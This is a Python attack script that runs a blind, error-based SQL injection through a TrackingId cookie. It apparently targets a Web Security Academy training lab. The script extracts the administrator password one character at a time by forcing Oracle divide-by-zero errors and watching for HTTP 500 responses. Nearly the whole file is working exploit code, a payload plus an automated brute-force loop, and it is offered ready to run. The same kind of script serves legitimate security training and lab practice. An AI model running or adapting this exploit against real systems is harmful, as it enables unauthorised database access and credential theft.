#!/usr/bin/env python3
import requests
import string
import time

# Target URL
url = 'https://0a5800990312775780c708f0001e0024.web-security-academy.net/'

# Character set to brute-force (lowercase + uppercase + digits)
charset = string.ascii_lowercase + string.digits  # or use string.printable for full charset

# Max password length to test
max_length = 20

# Store discovered characters
password = []

for position in range(1, max_length + 1):
    found = False
    for char in charset:
        # Build the SQL payload
        payload = f"t1WTEzKGwOuwsBbh'||(SELECT CASE WHEN SUBSTR((SELECT password FROM users WHERE username = 'administrator'), {position}, 1) = '{char}' THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"

        # Set up the cookie with your injection
        cookies = {
            'TrackingId': payload
        }

        # Measure response time
        response = requests.get(url, cookies=cookies)

        print(f"[{position}] Trying '{char}'")

        print(response.status_code)
        if (response.status_code == 500):
            password.append(char)
            print('Password so far: ' + ''.join(password))
            found = True
    if not found:
        print(f"[!] No match found at position {position} — consider expanding charset or increasing delay")

# Final output
print("\n[✓] Final password: \n" + ''.join(password))
